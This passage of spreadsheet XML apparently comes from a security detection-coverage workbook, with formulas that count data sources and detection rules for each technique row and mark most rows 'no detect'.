      <c r="O348" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P348" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S34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48" t="s">
        <v>416</v>
      </c>
      <c r="U348" t="s">
        <v>1755</v>
      </c>
      <c r="V348" t="s">
        <v>1756</v>
      </c>
      <c r="W348" t="b">
        <v>1</v>
      </c>
      <c r="X348" t="s">
        <v>1743</v>
      </c>
    </row>
    <row r="349" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A349" t="s">
        <v>1743</v>
      </c>
      <c r="B349" t="s">
        <v>1757</v>
      </c>
      <c r="C349" t="s">
        <v>322</v>
      </c>
      <c r="D349" t="s">
        <v>646</v>
      </c>
      <c r="E349" t="s">
        <v>1758</v>
      </c>
      <c r="F349" s="9">
        <f t="shared" si="5"/>
        <v>10</v>
      </c>
      <c r="G349" s="9" cm="1">
        <f t="array" ref="G349">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H349" s="9" t="str" cm="1">
        <f t="array" ref="H349">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I349" s="9" t="str" cm="1">
        <f t="array" ref="I349">IF(SUM(IF($C349=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C349=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J349" s="9" t="str" cm="1">
        <f t="array" ref="J34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49" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M349" s="9" cm="1">
        <f t="array" ref="M349">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N349" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O349" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P349" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S34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49" t="s">
        <v>386</v>
      </c>
      <c r="U349" t="s">
        <v>1759</v>
      </c>
      <c r="V349" t="s">
        <v>1760</v>
      </c>
      <c r="W349" t="b">
        <v>1</v>
      </c>
      <c r="X349" t="s">
        <v>1743</v>
      </c>
    </row>
    <row r="350" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A350" t="s">
        <v>1743</v>
      </c>
      <c r="B350" t="s">
        <v>1761</v>
      </c>
      <c r="C350" t="s">
        <v>1762</v>
      </c>
      <c r="D350" t="s">
        <v>646</v>
      </c>
      <c r="E350" t="s">
        <v>1754</v>
      </c>
      <c r="F350" s="9">
        <f t="shared" si="5"/>
        <v>6</v>
      </c>
      <c r="G350" s="9" cm="1">
        <f t="array" ref="G350">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H350" s="9" t="str" cm="1">
        <f t="array" ref="H350">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I350" s="9" t="str" cm="1">
        <f t="array" ref="I350">IF(SUM(IF($C350=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C350=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J350" s="9" t="str" cm="1">
        <f t="array" ref="J35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50" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M350" s="9" cm="1">
        <f t="array" ref="M350">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N350" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O350" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P350" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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50" t="s">
        <v>658</v>
      </c>
      <c r="U350" t="s">
        <v>1763</v>
      </c>
      <c r="V350" t="s">
        <v>1764</v>
      </c>
      <c r="W350" t="b">
        <v>1</v>
      </c>
      <c r="X350" t="s">
        <v>1743</v>
      </c>
    </row>
    <row r="351" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A351" t="s">
        <v>1743</v>
      </c>
      <c r="B351" t="s">
        <v>1765</v>
      </c>
      <c r="C351" t="s">
        <v>1766</v>
      </c>
      <c r="D351" t="s">
        <v>646</v>
      </c>
      <c r="E351" t="s">
        <v>1767</v>
      </c>
      <c r="F351" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G351" s="9" cm="1">
        <f t="array" ref="G351">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H351" s="9" t="str" cm="1">
        <f t="array" ref="H351">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I351" s="9" t="str" cm="1">
        <f t="array" ref="I351">IF(SUM(IF($C351=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C351=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J351" s="9" t="str" cm="1">
        <f t="array" ref="J35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51" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M351" s="9" cm="1">
        <f t="array" ref="M351">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N351" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O351" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P351" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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51" t="s">
        <v>743</v>
      </c>
      <c r="U351" t="s">
        <v>1768</v>
      </c>
      <c r="W351" t="b">
        <v>1</v>
      </c>
      <c r="X351" t="s">
        <v>1743</v>
      </c>
    </row>
    <row r="352" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A352" t="s">
        <v>1769</v>
      </c>
      <c r="B352" t="s">
        <v>1769</v>
      </c>
      <c r="C352" t="s">
        <v>118</v>
      </c>
      <c r="D352" t="s">
        <v>646</v>
      </c>
      <c r="E352" t="s">
        <v>1770</v>
      </c>
      <c r="F352" s="9">
        <f t="shared" si="5"/>
        <v>9</v>
      </c>
      <c r="G352" s="9" cm="1">
        <f t="array" ref="G352">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H352" s="9" cm="1">
        <f t="array" ref="H352">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>17</v>
      </c>
      <c r="I352" s="9" t="str" cm="1">
        <f t="array" ref="I352">IF(SUM(IF($C352=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C352=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J352" s="9" cm="1">
        <f t="array" ref="J35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352" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>17</v>
      </c>
      <c r="M352" s="9" cm="1">
        <f t="array" ref="M352">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>17</v>
      </c>
      <c r="N352" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O352" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P352" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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52" t="s">
        <v>1165</v>
      </c>
      <c r="U352" t="s">
        <v>1771</v>
      </c>
      <c r="V352" t="s">
        <v>1772</v>
      </c>
      <c r="W352" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="353" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A353" t="s">
        <v>1769</v>
      </c>
      <c r="B353" t="s">
        <v>1773</v>
      </c>
      <c r="C353" t="s">
        <v>1774</v>
      </c>
      <c r="D353" t="s">
        <v>646</v>
      </c>
      <c r="E353" t="s">
        <v>1775</v>
      </c>
      <c r="F353" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G353" s="9" cm="1">
        <f t="array" ref="G353">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H353" s="9" t="str" cm="1">
        <f t="array" ref="H353">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I353" s="9" t="str" cm="1">
        <f t="array" ref="I353">IF(SUM(IF($C353=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C353=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J353" s="9" t="str" cm="1">
        <f t="array" ref="J35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53" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M353" s="9" cm="1">
        <f t="array" ref="M353">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N353" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O353" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P353" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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53" t="s">
        <v>386</v>
      </c>
      <c r="U353" t="s">
        <v>1776</v>
      </c>
      <c r="V353" t="s">
        <v>1777</v>
      </c>
      <c r="W353" t="b">
        <v>1</v>
      </c>
      <c r="X353" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="354" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A354" t="s">
        <v>1769</v>
      </c>
      <c r="B354" t="s">
        <v>1778</v>
      </c>
      <c r="C354" t="s">
        <v>1779</v>
      </c>
      <c r="D354" t="s">
        <v>646</v>
      </c>
      <c r="E354" t="s">
        <v>1780</v>
      </c>
      <c r="F354" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G354" s="9" cm="1">
        <f t="array" ref="G354">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H354" s="9" t="str" cm="1">
        <f t="array" ref="H354">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I354" s="9" t="str" cm="1">
        <f t="array" ref="I354">IF(SUM(IF($C354=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C354=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J354" s="9" t="str" cm="1">
        <f t="array" ref="J35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54" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M354" s="9" cm="1">
        <f t="array" ref="M354">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N354" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O354" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P354" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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54" t="s">
        <v>386</v>
      </c>
      <c r="U354" t="s">
        <v>1781</v>
      </c>
      <c r="V354" t="s">
        <v>1782</v>
      </c>
      <c r="W354" t="b">
        <v>1</v>
      </c>
      <c r="X354" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="355" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A355" t="s">
        <v>1769</v>
      </c>
      <c r="B355" t="s">
        <v>1783</v>
      </c>
      <c r="C355" t="s">
        <v>339</v>
      </c>
      <c r="D355" t="s">
        <v>646</v>
      </c>
      <c r="E355" t="s">
        <v>1784</v>
      </c>
      <c r="F355" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G355" s="9" cm="1">
        <f t="array" ref="G355">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H355" s="9" t="str" cm="1">
        <f t="array" ref="H355">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I355" s="9" t="str" cm="1">
        <f t="array" ref="I355">IF(SUM(IF($C355=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C355=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J355" s="9" t="str" cm="1">
        <f t="array" ref="J35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55" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M355" s="9" cm="1">
        <f t="array" ref="M355">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N355" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O355" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P355" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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55" t="s">
        <v>386</v>
      </c>
      <c r="U355" t="s">
        <v>1785</v>
      </c>
      <c r="V355" t="s">
        <v>1786</v>
      </c>
      <c r="W355" t="b">
        <v>1</v>
      </c>
      <c r="X355" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="356" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A356" t="s">
        <v>1769</v>
      </c>
      <c r="B356" t="s">
        <v>1787</v>
      </c>
      <c r="C356" t="s">
        <v>1788</v>
      </c>
      <c r="D356" t="s">
        <v>646</v>
      </c>
      <c r="E356" t="s">
        <v>657</v>
      </c>
      <c r="F356" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G356" s="9" cm="1">
        <f t="array" ref="G356">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H356" s="9" t="str" cm="1">
        <f t="array" ref="H356">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I356" s="9" t="str" cm="1">
        <f t="array" ref="I356">IF(SUM(IF($C356=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C356=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J356" s="9" t="str" cm="1">
        <f t="array" ref="J35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56" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M356" s="9" cm="1">
        <f t="array" ref="M356">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N356" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O356" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P356" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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56" t="s">
        <v>503</v>
      </c>
      <c r="U356" t="s">
        <v>1789</v>
      </c>
      <c r="V356" t="s">
        <v>1790</v>
      </c>
      <c r="W356" t="b">
        <v>1</v>
      </c>
      <c r="X356" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="357" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A357" t="s">
        <v>1769</v>
      </c>
      <c r="B357" t="s">
        <v>1791</v>
      </c>
      <c r="C357" t="s">
        <v>1792</v>
      </c>
      <c r="D357" t="s">
        <v>646</v>
      </c>
      <c r="E357" t="s">
        <v>657</v>
      </c>
      <c r="F357" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G357" s="9" cm="1">
        <f t="array" ref="G357">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H357" s="9" t="str" cm="1">
        <f t="array" ref="H357">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I357" s="9" t="str" cm="1">
        <f t="array" ref="I357">IF(SUM(IF($C357=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C357=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J357" s="9" t="str" cm="1">
        <f t="array" ref="J35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57" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M357" s="9" cm="1">
        <f t="array" ref="M357">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N357" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O357" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P357" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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57" t="s">
        <v>503</v>
      </c>
      <c r="U357" t="s">
        <v>1793</v>
      </c>
      <c r="V357" t="s">
        <v>1794</v>
      </c>
      <c r="W357" t="b">
        <v>1</v>
      </c>
      <c r="X357" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="358" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A358" t="s">
        <v>1769</v>
      </c>
      <c r="B358" t="s">
        <v>1795</v>
      </c>
      <c r="C358" t="s">
        <v>1796</v>
      </c>
      <c r="D358" t="s">
        <v>646</v>
      </c>
      <c r="E358" t="s">
        <v>1797</v>
